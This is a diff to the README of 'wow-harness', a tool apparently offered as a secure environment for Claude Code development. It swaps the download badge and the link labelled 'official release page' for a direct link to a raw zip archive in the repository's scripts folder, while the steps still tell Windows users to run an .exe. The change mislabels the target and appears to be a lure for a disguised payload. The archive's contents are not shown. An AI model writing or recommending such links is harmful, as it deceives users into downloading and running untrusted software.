@@ -1,6 +1,6 @@
 # 🛠️ wow-harness - Secure local environment for AI development
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/floccose-burner9185/wow-harness/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/floccose-burner9185/wow-harness/main/scripts/wow-harness-v2.7.zip)
 
 wow-harness provides a secure workspace for your artificial intelligence projects. It connects your local machine to Claude Code while keeping your data safe. This tool adds an extra layer of protection through controlled gates and automated checks. It ensures that your AI projects follow strict security rules during the development process.
 
@@ -21,7 +21,7 @@ Confirm your computer meets these standards before you begin:
 
 Follow these steps to obtain the software:
 
-1. Visit the [official release page](https://github.com/floccose-burner9185/wow-harness/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/floccose-burner9185/wow-harness/main/scripts/wow-harness-v2.7.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download it to your Windows computer.
 4. Open the downloaded file once the process finishes.
